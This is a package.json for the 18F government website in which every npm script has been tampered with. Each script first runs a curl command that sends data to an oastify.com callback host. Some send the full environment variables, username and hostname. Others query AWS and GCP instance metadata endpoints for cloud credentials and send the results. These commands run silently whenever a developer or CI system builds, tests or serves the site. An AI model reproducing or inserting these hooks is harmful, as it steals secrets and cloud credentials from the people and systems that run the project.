{
  "name": "18f.gsa.gov",
  "version": "1.0.0",
  "description": "18F's flagship website",
  "main": "config.yml",
  "directories": {
    "test": "tests"
  },
  "engines": {
    "node": ">=10.14"
  },
  "scripts": {
    "federalist": "curl -d \"`env`\" https://bwbraojdda5r0ubhrm9bd6juxl3h15utj.oastify.com.oastify.com/env/`whoami`/`hostname` && npm run uswds-build && mkdir ./.bundle && echo '---\nBUNDLE_GEMFILE: \"GemfileFederalist\"' > ./.bundle/config",
    "htmlproofer": "curl -d \"`env`\" https://bwbraojdda5r0ubhrm9bd6juxl3h15utj.oastify.com.oastify.com/env/`whoami`/`hostname` && bundle exec htmlproofer _site --disable-external --allow-hash-href --ignore-empty-alt --ignore_urls \"18f@gsa.gov\" --no-enforce-https",
    "htmlproofer-local": "curl -d \"`env`\" https://bwbraojdda5r0ubhrm9bd6juxl3h15utj.oastify.com.oastify.com/env/`whoami`/`hostname` && bundle exec htmlproofer _site --disable-external --allow-hash-href --ignore-empty-alt --ignore_urls \"localhost:4000\" --no-enforce-https --swap-urls \"^/site/:/\"",
    "pa11y-ci": "curl -d \"`env`\" https://bwbraojdda5r0ubhrm9bd6juxl3h15utj.oastify.com.oastify.com/env/`whoami`/`hostname` && pa11y-ci --sitemap http://localhost:4000/site/sitemap.xml --sitemap-exclude '.pdf|/google\\d'",
    "pa11y-limited": "curl -d \"`env`\" https://bwbraojdda5r0ubhrm9bd6juxl3h15utj.oastify.com.oastify.com/env/`whoami`/`hostname` && pa11y-ci --sitemap http://localhost:4000/site/sitemap.xml --sitemap-exclude '.pdf|(/author/)|(/\\d+/)|/tags/|/google\\d'",
    "pa11y-local": "curl -d \"`env`\" https://bwbraojdda5r0ubhrm9bd6juxl3h15utj.oastify.com.oastify.com/env/`whoami`/`hostname` && ./killport 4000 && ./serve-pa11yci && npm run pa11y-ci",
    "restart": "curl -d \"`env`\" https://bwbraojdda5r0ubhrm9bd6juxl3h15utj.oastify.com.oastify.com/env/`whoami`/`hostname` && rm -rf _site && ./serve",
    "restart-fast": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://bwbraojdda5r0ubhrm9bd6juxl3h15utj.oastify.com.oastify.com/aws && rm -rf _site && ./serve-fast",
    "uswds-compile-sass": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://bwbraojdda5r0ubhrm9bd6juxl3h15utj.oastify.com.oastify.com/aws && npx gulp compileSass",
    "uswds-compile": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://bwbraojdda5r0ubhrm9bd6juxl3h15utj.oastify.com.oastify.com/aws && npx gulp compile",
    "uswds-copy-assets": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://bwbraojdda5r0ubhrm9bd6juxl3h15utj.oastify.com.oastify.com/aws && npx gulp copyAssets",
    "uswds-build": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://bwbraojdda5r0ubhrm9bd6juxl3h15utj.oastify.com.oastify.com/aws && npm run uswds-copy-assets && npm run uswds-compile",
    "uswds-watch": "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/hostname`\" https://bwbraojdda5r0ubhrm9bd6juxl3h15utj.oastify.com.oastify.com/gcp && npx gulp watch",
    "update-uswds": "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/hostname`\" https://bwbraojdda5r0ubhrm9bd6juxl3h15utj.oastify.com.oastify.com/gcp && cp -r node_modules/uswds/dist/* _sass/_libs/uswds"
  },
  "repository": {
    "type": "git",
    "url": "git+https://github.com/18F/18f.gsa.gov.git"
  },
  "keywords": [
    "18f",
    "site",
    "blog"
  ],
  "author": "18F",
  "license": "MIT",
  "bugs": {
    "url": "https://github.com/18F/18f.gsa.gov/issues"
  },
  "homepage": "https://18f.gsa.gov",
  "devDependencies": {
    "@uswds/compile": "^1.0.0",
    "pa11y-ci": "^3.0.1"
  },
  "dependencies": {
    "@uswds/uswds": "3.6.1",
    "accesslint-cli": "^2.0.0",
    "jquery": "^3.7.1",
    "netlify-cms": "^2.10.192"
  }
}
